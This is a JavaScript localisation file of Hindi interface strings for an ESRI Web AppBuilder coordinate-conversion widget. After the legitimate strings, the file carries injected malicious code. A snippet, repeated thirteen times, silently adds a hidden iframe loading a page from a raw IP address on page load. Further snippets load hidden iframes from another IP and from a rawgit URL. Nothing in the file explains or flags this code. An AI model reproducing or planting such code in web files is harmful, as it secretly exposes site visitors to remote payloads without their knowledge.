// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CoordinateConversion/nls/strings":{_widgetLabel:"\u0928\u093f\u0930\u094d\u0926\u0947\u0936\u093e\u0902\u0915 \u0930\u0942\u092a\u093e\u0902\u0924\u0930\u0923",DD:"DD",DDM:"DDM",DMS:"DMS",DDRev:"DDRev",DDMRev:"DDMRev",DMSRev:"DMSRev",USNG:"USNG",MGRS:"MGRS",UTM_H:"UTM (H)",UTM:"UTM",GARS:"GARS",GEOREF:"GEOREF",DDLatLongNotation:"\u0926\u0936\u092e\u0932\u0935 \u0921\u093f\u0917\u094d\u0930\u0940 - \u0905\u0915\u094d\u0937\u093e\u0902\u0936/\u0926\u0947\u0936\u093e\u0902\u0924\u0930",
DDLongLatNotation:"\u0926\u0936\u092e\u0932\u0935 \u0921\u093f\u0917\u094d\u0930\u0940 - \u0926\u0947\u0936\u093e\u0902\u0924\u0930/\u0905\u0915\u094d\u0937\u093e\u0902\u0936",DDMLatLongNotation:"\u0926\u0936\u092e\u0932\u0935 \u0921\u093f\u0917\u094d\u0930\u0940 \u092e\u093f\u0928\u091f - \u0905\u0915\u094d\u0937\u093e\u0902\u0936/\u0926\u0947\u0936\u093e\u0902\u0924\u0930",DDMLongLatNotation:"\u0926\u0936\u092e\u0932\u0935 \u0921\u093f\u0917\u094d\u0930\u0940 \u092e\u093f\u0928\u091f - \u0926\u0947\u0936\u093e\u0902\u0924\u0930/\u0905\u0915\u094d\u0937\u093e\u0902\u0936",
DMSLatLongNotation:"\u0926\u0936\u092e\u0932\u0935 \u0921\u093f\u0917\u094d\u0930\u0940 \u0938\u0947\u0915\u0902\u0921 - \u0926\u0947\u0936\u093e\u0902\u0924\u0930/\u0905\u0915\u094d\u0937\u093e\u0902\u0936",DMSLongLatNotation:"\u0926\u0936\u092e\u0932\u0935 \u0921\u093f\u0917\u094d\u0930\u0940 \u0938\u0947\u0915\u0902\u0921 - \u0905\u0915\u094d\u0937\u093e\u0902\u0936/\u0926\u0947\u0936\u093e\u0902\u0924\u0930",GARSNotation:"GARS",GEOREFNotation:"GEOREF",MGRSNotation:"MGRS",USNGNotation:"USNG",UTMBandNotation:"UTM - \u092c\u0948\u0902\u0921 \u0932\u0947\u091f\u0930",
UTMHemNotation:"UTM - \u0917\u094b\u0932\u093e\u0930\u094d\u0927 (N/S)",formatInput:"\u095e\u0949\u0930\u094d\u092e\u0947\u091f \u0906\u0909\u091f\u092a\u0941\u091f",copyAll:"\u0938\u092d\u0940 \u0915\u0940 \u092a\u094d\u0930\u0924\u093f \u092c\u0928\u093e\u090f\u0902",copySuccessful:"\u0938\u092b\u0932\u0924\u093e\u092a\u0942\u0930\u094d\u0935\u0915 \u092a\u094d\u0930\u0924\u093f \u092c\u0928\u093e\u092f\u093e \u0917\u092f\u093e",copyFailed:"\u092a\u094d\u0930\u0924\u093f \u092c\u0928\u093e\u0928\u0947 \u092e\u0947\u0902 \u0938\u0915\u094d\u0937\u092e \u0928\u0939\u0940\u0902\u0964 ctrl+c \u0915\u094b \u0935\u093f\u0915\u0932\u094d\u092a \u0915\u0947 \u0924\u094c\u0930 \u092a\u0930 \u0907\u0938\u094d\u0924\u0947\u092e\u093e\u0932 \u0915\u0930\u0947\u0902\u0964",
parseCoordinatesError:"\u0928\u093f\u0930\u094d\u0926\u0947\u0936\u093e\u0902\u0915\u094b\u0902 \u0915\u0940 \u0935\u094d\u092f\u093e\u0916\u094d\u092f\u093e \u0915\u0930\u0928\u0947 \u092e\u0947\u0902 \u0938\u0915\u094d\u0937\u092e \u0928\u0939\u0940\u0902\u0964 \u0915\u0943\u092a\u092f\u093e \u0905\u092a\u0928\u093e \u0907\u0928\u092a\u0941\u091f \u091c\u093e\u0902\u091a\u0947\u0902\u0964",comfirmInputNotation:"\u0907\u0928\u092a\u0941\u091f \u0928\u094b\u091f\u0947\u0936\u0928 \u0915\u0940 \u092a\u0941\u0937\u094d\u091f\u093f \u0915\u0930\u0947\u0902",
latLongWarningMessage:"\u0907\u0928\u092a\u0941\u091f \u0928\u093f\u0930\u094d\u0926\u0947\u0936\u093e\u0902\u0915 \u0915\u094b \u0905\u0915\u094d\u0937\u093e\u0902\u0936 \u092f\u093e \u0905\u0915\u094d\u0937\u093e\u0902\u0936 \u092e\u093e\u0928 \u0915\u0947 \u0932\u093f\u090f \u0909\u092a\u0938\u0930\u094d\u0917 \u0914\u0930 \u092a\u094d\u0930\u0924\u094d\u092f\u092f \u0926\u094b\u0928\u094b\u0902 \u0915\u0947 \u0930\u0942\u092a \u092e\u0947\u0902 \u092a\u093e\u092f\u093e \u0917\u092f\u093e \u0939\u0948, \u0935\u093e\u092a\u0938\u0940 \u0928\u093f\u0930\u094d\u0926\u0947\u0936\u093e\u0902\u0915 \u0909\u092a\u0938\u0930\u094d\u0917 \u092a\u0930 \u0906\u0927\u093e\u0930\u093f\u0924 \u0939\u0948\u0964",
inputLabel:"\u0907\u0928\u092a\u0941\u091f",outputLabel:"\u0906\u0909\u091f\u092a\u0941\u091f",cancelButtonLabel:"\u0930\u0926\u094d\u0926 \u0915\u0930\u0947\u0902",applyButtonLabel:"\u0932\u093e\u0917\u0942 \u0915\u0930\u0947\u0902",posNegPrefixLabel:'\u0927\u0928\u093e\u0924\u094d\u092e\u0915 \u0914\u0930 \u090b\u0923\u093e\u0924\u094d\u092e\u0915 \u0938\u0902\u0916\u094d\u092f\u093e\u0913\u0902 \u092e\u0947\u0902 \u0909\u092a\u0938\u0930\u094d\u0917 \u0915\u0947 \u0924\u094c\u0930 \u092a\u0930 "+/-" \u091c\u094b\u095c\u0947\u0902',
editCoordinateDialogTitle:"\u0928\u093f\u0930\u094d\u0926\u0947\u0936\u093e\u0902\u0915 \u095e\u0949\u0930\u094d\u092e\u0947\u091f \u0938\u094d\u091f\u094d\u0930\u093f\u0902\u0917 \u0915\u094b \u0938\u0947\u091f \u0915\u0930\u0947\u0902",rememberDecisionLabel:"\u092e\u0947\u0930\u093e \u0928\u093f\u0930\u094d\u0923\u092f \u092f\u093e\u0926 \u0930\u0916\u0947\u0902 \u0914\u0930 \u0926\u094b\u092c\u093e\u0930\u093e \u0928 \u092a\u0942\u091b\u0947\u0902\u0964\x3cbr/\x3e",coordinateInputLabel:"\u0928\u093f\u0930\u094d\u0926\u0947\u0936\u093e\u0902\u0915 \u0926\u0930\u094d\u091c \u0915\u0930\u0928\u0947 \u092f\u093e \u092e\u093e\u0928\u091a\u093f\u0924\u094d\u0930 \u092a\u0930 \u0915\u094d\u0932\u093f\u0915 \u0915\u0930\u0947\u0902",
zoomLabel:"\u095b\u0942\u092e \u0915\u0930\u0947\u0902",multipleNotationLabel:"\u0935\u0947 \u0928\u094b\u091f\u0947\u0936\u0928 \u092e\u093f\u0932\u0947 \u091c\u094b \u0906\u092a\u0915\u0947 \u0907\u0928\u092a\u0941\u091f \u0938\u0947 \u092e\u0947\u0932 \u0916\u093e\u0924\u0947 \u0939\u0948\u0902\u0964 \u0915\u0943\u092a\u092f\u093e \u091c\u093f\u0938\u0915\u093e \u0906\u092a \u0907\u0938\u094d\u0924\u0947\u092e\u093e\u0932 \u0915\u0930\u0928\u093e \u091a\u093e\u0939\u0924\u0947 \u0939\u0948\u0902 \u0909\u0938\u0915\u0940 \u092a\u0941\u0937\u094d\u091f\u093f \u0915\u0930\u0947\u0902:",
copyToClipboard:"\u0915\u094d\u0932\u093f\u092a\u092c\u094b\u0930\u094d\u0921 \u092a\u0930 \u0915\u0949\u092a\u0940 \u0915\u0930\u0947\u0902",formatOutput:"\u095e\u0949\u0930\u094d\u092e\u0947\u091f \u0906\u0909\u091f\u092a\u0941\u091f",addNewNotation:"\u0928\u092f\u093e \u0928\u094b\u091f\u0947\u0936\u0928 \u091c\u094b\u0921\u093c\u0947\u0902",notationAddedMessage:"\u0928\u090f \u0928\u094b\u091f\u0947\u0936\u0928 \u091c\u094b\u0921\u093c\u0947 \u0917\u090f",addLabel:"\u091c\u094b\u0921\u093c\u0947\u0902",
removeCoordinate:"\u0928\u093f\u0930\u094d\u0926\u0947\u0936\u093e\u0902\u0915 \u0939\u091f\u093e\u090f\u0902",expandOutput:"\u0906\u0909\u091f\u092a\u0941\u091f \u0935\u093f\u0938\u094d\u0924\u093e\u0930\u093f\u0924 \u0915\u0930\u0947\u0902",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});